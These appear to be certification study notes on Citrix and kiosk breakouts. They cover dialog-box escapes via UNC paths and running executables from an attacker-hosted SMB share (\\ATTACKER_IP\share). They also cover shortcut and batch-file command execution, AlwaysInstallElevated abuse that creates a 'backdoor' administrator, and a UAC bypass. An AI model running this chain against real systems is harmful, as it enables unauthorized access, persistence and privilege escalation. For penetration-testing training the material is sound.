This section is about **breaking out of restricted Windows/Citrix desktop environments**. The core idea is that even when normal Explorer, `cmd.exe`, PowerShell, Registry Editor, and directory browsing are restricted by Group Policy, **applications often expose alternate paths to Windows functionality**.

---

## 1. What is a Citrix Breakout?

Organizations use technologies such as:

- Terminal Services / RDP
    
- Citrix
    
- AWS AppStream
    
- CyberArk PSM
    
- Kiosk environments
    

to provide controlled remote access.

They commonly apply **lock-down measures** to prevent users from accessing the underlying operating system.

The objective during a breakout is to move from:

```text
Restricted Citrix Application
          ↓
   Windows Dialog Box
          ↓
   Command Execution
          ↓
   OS Access
          ↓
Privilege Escalation
```

The source's basic methodology is:

> **Dialog Box → Command Execution → Privilege Escalation**

### CPTS Mental Model

Think:

```text
Can I interact with Windows?
        │
        ▼
Can I open a dialog?
        │
        ▼
Can I access a path / UNC share?
        │
        ▼
Can I execute an EXE/script?
        │
        ▼
Can I obtain CMD/PowerShell?
        │
        ▼
Enumerate for PrivEsc
```

---

# 2. Why Dialog Boxes Matter

A restricted environment may block:

```text
cmd.exe
powershell.exe
C:\Windows\System32
C:\Users
```

through Group Policy.

But applications still need to perform normal operations such as:

- Open
    
- Save
    
- Save As
    
- Import
    
- Export
    
- Browse
    
- Search
    
- Print
    
- Load
    

These operations frequently create a **Windows file dialog**.

That dialog can become the bridge from the restricted application to the underlying Windows filesystem.

### Important idea

The application may be restricted.

The **Windows dialog it launches may not be restricted in the same way**.

---

# 3. Bypassing Path Restrictions

Suppose File Explorer prevents:

```text
C:\Users
```

and displays:

```text
Accessing the resource 'C:\Users' has been disallowed.
```

The source demonstrates using **MS Paint → File → Open** to obtain a dialog box.

Then enter:

```text
\\127.0.0.1\c$\users\pmorgan
```

into the **File name** field.

Set:

```text
File type → All Files
```

and press Enter.

This reaches the user's directory despite the Explorer restriction.

### Why `\\127.0.0.1\c$`?

This is a **UNC path** accessing the local machine through its SMB administrative share:

```text
\\127.0.0.1\c$
```

Conceptually:

```text
Normal path
C:\Users\pmorgan
       ↓
Blocked by policy

UNC path
\\127.0.0.1\c$\Users\pmorgan
       ↓
Handled through network/SMB path
       ↓
Directory becomes accessible
```

### CPTS takeaway

When normal filesystem navigation is blocked:

> **Try alternate path representations, especially UNC paths.**

---

# 4. Applications That Can Give You a Dialog Box

The source specifically mentions applications such as:

- Paint
    
- Notepad
    
- WordPad
    

and functionality such as:

```text
Open
Save
Save As
Load
Browse
Import
Export
Help
Search
Scan
Print
```

These are worth checking whenever you are trapped inside a restricted desktop.

### Enumeration mindset

Don't ask only:

> "Can I run cmd.exe?"

Ask:

> "What application can I run that gives me a path/file dialog?"

That shift in thinking is extremely useful for CPTS.

---

# 5. Accessing an SMB Share from the Restricted Environment

The same UNC trick can be used to access a remote SMB share.

From your attacking/Ubuntu machine:

```bash
smbserver.py -smb2support share $(pwd)
```

This creates an SMB share named:

```text
share
```

The source then accesses it from the Citrix environment through a Paint dialog:

```text
\\10.13.38.95\share
```

with:

```text
File Type → All Files
```

### Mental model

```text
Attacker machine
      │
      │ SMB
      ▼
\\10.13.38.95\share
      │
      ▼
Citrix file dialog
      │
      ▼
Restricted environment
```

This can provide a way to transfer tools/files into the target environment.

---

# 6. Executing an EXE Directly from the SMB Share

An interesting restriction in the lab is that files cannot simply be copied using normal Explorer.

However, the source demonstrates:

1. Open the SMB share through Paint.
    
2. Right-click an executable.
    
3. Select **Open**.
    
4. Execute it directly.
    

The example is:

```text
pwn.exe
```

The binary contains:

```c
#include <stdlib.h>

int main() {
    system("C:\\Windows\\System32\\cmd.exe");
}
```

So execution of the binary results in a command prompt.

### Key concept

A restriction on:

```text
Opening C:\Windows\System32\cmd.exe
```

doesn't necessarily mean:

```text
Executing another program that launches cmd.exe
```

is blocked.

That is a classic **indirect execution path**.

---

# 7. Copying Files Once CMD Is Obtained

Once command execution is achieved, the restrictions become much less significant.

The source demonstrates using CMD to copy files from the SMB share to the user's Desktop.

Your workflow becomes:

```text
Citrix
  ↓
Paint
  ↓
File dialog
  ↓
SMB share
  ↓
Execute pwn.exe
  ↓
CMD
  ↓
Copy tools/scripts locally
  ↓
Enumeration
  ↓
Privilege escalation
```

This is an important transition point.

---

# 8. Alternate Explorer — Explorer++

Sometimes you can obtain a command prompt but still want a graphical filesystem browser.

The source mentions:

- Q-Dir
    
- Explorer++
    

These alternative filesystem editors may bypass restrictions enforced specifically against the standard Windows Explorer.

### Why Explorer++ is useful

The source highlights that Explorer++ is:

- Portable
    
- Does not require installation
    
- Fast
    
- User-friendly
    

Therefore it can be transferred and executed from the restricted environment.

### CPTS lesson

Don't assume:

```text
Explorer blocked = filesystem inaccessible
```

Instead:

```text
Explorer blocked
      ↓
Try alternate filesystem applications
```

---

# 9. Alternate Registry Editors

The same concept applies to Registry Editor.

If:

```text
regedit.exe
```

is blocked through Group Policy, alternative registry editors may still work.

The source mentions:

- SimpleRegEdit
    
- UberRegEdit
    
- SmallRegistryEditor
    

These provide GUI access to Windows Registry functionality without relying on the standard Registry Editor.

### Mental model

```text
Blocked application ≠ blocked underlying functionality
```

This principle appears repeatedly in restricted-environment breakouts.

---

# 10. Modifying an Existing Shortcut

Windows shortcuts (`.lnk`) can provide another execution path.

The source demonstrates modifying an existing shortcut:

1. Right-click shortcut.
    
2. Select **Properties**.
    
3. Modify the **Target**.
    
4. Point it toward the desired executable.
    
5. Execute the shortcut.
    

The example changes the target to:

```text
C:\Windows\System32\cmd.exe
```

and executing the shortcut spawns CMD.

### Important concept

A shortcut is essentially an execution mechanism:

```text
.lnk
 ↓
Target
 ↓
Executable
 ↓
Process
```

If you can modify the target, you may be able to redirect execution.

---

# 11. Creating / Transferring a Shortcut

If an existing useful shortcut isn't available, the source gives two alternatives:

### Option 1 — Transfer one

Use the SMB share to bring an existing `.lnk` file into the environment.

### Option 2 — Create one

Create a new shortcut using PowerShell.

The source points to the HTB **Interacting with Users** material for generating malicious `.lnk` files.

---

# 12. Script Execution

Another possible breakout path is script execution.

The source discusses:

```text
.bat
.vbs
.ps
```

If Windows automatically associates these extensions with their interpreters, executing a script can provide command execution or download/launch other applications.

### Simplest example

Create:

```text
evil.bat
```

containing:

```bat
cmd
```

Execute it:

```text
evil.bat
```

and it launches a Command Prompt.

### CPTS concept

Look for **execution primitives**:

```text
EXE
BAT
VBS
PS1
LNK
MSI
```

If one of these can execute, the restrictive GUI may no longer matter.

---

# 13. Once CMD Is Obtained → Privilege Escalation

This is where the second stage of the methodology begins.

The source recommends tools such as:

```text
WinPEAS
PowerUp
```

for finding privilege-escalation opportunities.

The lab discovers:

```text
AlwaysInstallElevated
```

is enabled.

---

# 14. AlwaysInstallElevated

This is a Windows Installer policy.

The important condition in the lab is that the setting is enabled in **both**:

```text
HKCU
```

and:

```text
HKLM
```

### Check HKCU

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Expected lab output:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

### Check HKLM

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Again:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

### CPTS Must Know

Don't just check one location.

Check:

```text
HKCU + HKLM
```

The lab demonstrates both being set to `1`.

---

# 15. PowerUp `Write-UserAddMSI`

The source uses PowerUp:

```powershell
Import-Module .\PowerUp.ps1
```

Then:

```powershell
Write-UserAddMSI
```

This generates:

```text
UserAdd.msi
```

on the Desktop.

The generated MSI is then used in the lab to create:

```text
backdoor
```

with a password and membership in:

```text
Administrators
```

---

# 16. Running as the New User

The source then uses:

```cmd
runas /user:backdoor cmd
```

and supplies the password.

This launches CMD as:

```text
VDESKTOP3\backdoor
```

### Important distinction

At this point:

```text
backdoor ∈ Administrators
```

does **not automatically mean**:

```text
current process = fully elevated Administrator
```

This is exactly where UAC becomes relevant.

---

# 17. UAC and the Administrator Token

Even though `backdoor` belongs to:

```text
Administrators
```

the lab still cannot access:

```text
C:\Users\Administrator
```

and receives:

```text
Access is denied.
```

The source explains this in the context of UAC.

### Mental model

```text
backdoor
   │
   └── Member of Administrators
              │
              ▼
       UAC / token filtering
              │
              ▼
     Not fully elevated yet
```

This connects directly with the **UAC section you already studied**.

---

# 18. UAC Bypass

The source demonstrates using:

```powershell
Import-Module .\Bypass-UAC.ps1
```

followed by:

```powershell
Bypass-UAC -Method UacMethodSysprep
```

After successful bypass, a higher-privileged PowerShell window is opened.

Verification:

```cmd
whoami /all
```

or:

```cmd
whoami /priv
```

The source then demonstrates access to:

```text
C:\Users\Administrator
```

and the lab flag.

---

# 🔥 Complete Citrix Breakout Attack Chain

This is the part I would memorize for CPTS:

```text
             RESTRICTED CITRIX
                    │
                    ▼
          Find an application
                    │
                    ▼
             Get Dialog Box
                    │
                    ▼
       Abuse UNC / alternate paths
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
   Local filesystem       SMB share
          │                   │
          └─────────┬─────────┘
                    ▼
            Execute EXE/script
                    │
                    ▼
                  CMD
                    │
                    ▼
          Enumerate the system
                    │
                    ▼
             Find PrivEsc
                    │
                    ▼
        AlwaysInstallElevated
                    │
                    ▼
             Generate MSI
                    │
                    ▼
          Administrator user
                    │
                    ▼
                  UAC
                    │
                    ▼
              UAC bypass
                    │
                    ▼
             Elevated access
```

---

# 🧠 CPTS Breakout Methodology

When you encounter a restricted Windows/Citrix environment, think in this order:

### Phase 1 — Identify the restriction

Ask:

```text
Can I open CMD?
Can I open PowerShell?
Can I browse C:\?
Can I open System32?
Can I run EXEs?
Can I access SMB?
Can I open Registry Editor?
Can I create/modify shortcuts?
Can I execute scripts?
```

---

### Phase 2 — Find a dialog

Look for:

```text
Paint
Notepad
WordPad
Office
PDF readers
Browsers
File upload/download dialogs
Open/Save dialogs
```

The important feature isn't the application itself.

It's:

```text
FILE → OPEN
FILE → SAVE AS
```

---

### Phase 3 — Test alternate paths

Try:

```text
C:\...
```

then potentially:

```text
\\127.0.0.1\c$\...
```

or a remote SMB share:

```text
\\ATTACKER_IP\share
```

---

### Phase 4 — Establish execution

Look for:

```text
.exe
.bat
.ps1
.vbs
.lnk
.msi
```

The source demonstrates several routes:

```text
SMB → EXE
Shortcut → CMD
BAT → CMD
MSI → PrivEsc
```

---

### Phase 5 — Transfer tools

Once you have command execution:

```text
SMB
HTTP
UNC
```

can be used for moving tools/scripts, depending on the lab/environment.

---

### Phase 6 — Enumerate PrivEsc

Run your normal Windows enumeration:

```cmd
whoami /all
whoami /priv
whoami /groups
systeminfo
```

Then look for:

```text
Weak services
Weak permissions
Registry weaknesses
AlwaysInstallElevated
Unquoted service paths
SeImpersonatePrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
Installed vulnerable software
Kernel vulnerabilities
UAC issues
```

---

# ⚡ CPTS Cheat Sheet

|Goal|Technique|
|---|---|
|Escape restricted Explorer|Windows dialog|
|Access blocked filesystem|UNC path|
|Access local C:|`\\127.0.0.1\c$`|
|Access attacker files|`\\ATTACKER_IP\share`|
|Create SMB share|`smbserver.py -smb2support share $(pwd)`|
|Get CMD|Execute suitable EXE|
|Alternate Explorer|Explorer++|
|Alternate Registry Editor|SmallRegistryEditor etc.|
|Execute via shortcut|Modify `.lnk` Target|
|Execute script|`.bat`, `.vbs`, `.ps1`|
|Check AlwaysInstallElevated|`reg query ... /v AlwaysInstallElevated`|
|Generate MSI|`Write-UserAddMSI`|
|Run as user|`runas /user:USER cmd`|
|Check privileges|`whoami /priv`|
|Full identity/security info|`whoami /all`|
|UAC bypass lab technique|`Bypass-UAC -Method UacMethodSysprep`|

---

# 🎯 Important CPTS Takeaways

### 1. Don't fight the restriction directly

If:

```text
cmd.exe blocked
```

don't spend all your time trying to launch `cmd.exe`.

Find an application that can **indirectly reach the same functionality**.

---

### 2. Dialog boxes are attack surfaces

Remember:

```text
Restricted GUI
       ↓
Application
       ↓
Open/Save dialog
       ↓
Filesystem / UNC
       ↓
Execution
```

---

### 3. UNC paths are extremely important

Know the difference:

```text
C:\Users\pmorgan
```

vs.

```text
\\127.0.0.1\c$\Users\pmorgan
```

The source specifically demonstrates the latter as a way around the Explorer restriction.

---

### 4. Think beyond Explorer

If Explorer is restricted:

```text
Explorer++
Q-Dir
Paint dialog
Notepad dialog
```

may expose alternative functionality.

---

### 5. Think beyond `cmd.exe`

Command execution can come from:

```text
EXE
BAT
VBS
PowerShell
LNK
MSI
```

---

### 6. Administrator membership ≠ elevated token

This is especially important because you already studied UAC.

```text
Administrator group membership
             ≠
       Elevated token
```

You may need to investigate UAC after obtaining an Administrator account.

---

### 7. Breakout and privilege escalation are separate stages

The source explicitly separates the methodology:

```text
1. Dialog Box
2. Command Execution
3. Privilege Escalation
```

So don't confuse:

```text
"I escaped Citrix"
```

with:

```text
"I am SYSTEM"
```

The breakout gives you a foothold into the underlying OS. **Then enumerate and escalate.**

---

## 🧩 Viva Questions

**Q1. What is a Citrix breakout?**  
Escaping a restricted Citrix/remote desktop environment to obtain greater access to the underlying Windows operating system.

**Q2. What is the basic breakout methodology?**  
Dialog Box → Command Execution → Privilege Escalation.

**Q3. Why are Windows dialog boxes useful?**  
They can provide filesystem/path access even when normal Explorer navigation is restricted.

**Q4. What is a UNC path?**  
A Windows path used to access network resources, such as:

```text
\\server\share
```

**Q5. How can you access the local C: drive through a UNC path?**

```text
\\127.0.0.1\c$
```

**Q6. How can an attacker access files from an attacking machine?**

```bash
smbserver.py -smb2support share $(pwd)
```

then access:

```text
\\ATTACKER_IP\share
```

**Q7. Name some applications that can provide useful dialogs.**

```text
Paint
Notepad
WordPad
```

**Q8. What is the purpose of Explorer++ in this scenario?**  
It can provide alternative filesystem navigation when standard Explorer is restricted.

**Q9. What file types can provide script/execution paths?**

```text
.bat
.vbs
.ps1
```

**Q10. What is AlwaysInstallElevated?**  
A Windows Installer policy that, when appropriately configured, can allow MSI packages to execute with elevated privileges.

**Q11. Which two registry locations should you check?**

```text
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Q12. What does `whoami /priv` show?**  
The privileges associated with the current security token.

**Q13. Why can an Administrator-group user still receive Access Denied?**  
Because UAC can cause the process to operate with a filtered/non-elevated token.

---

# 🔥 The One-Line Memory Trick

> **Dialog → UNC → Execute → CMD → Enumerate → PrivEsc → UAC → Elevated Access**

That is the **core CPTS mental model** for this entire Citrix Breakout section.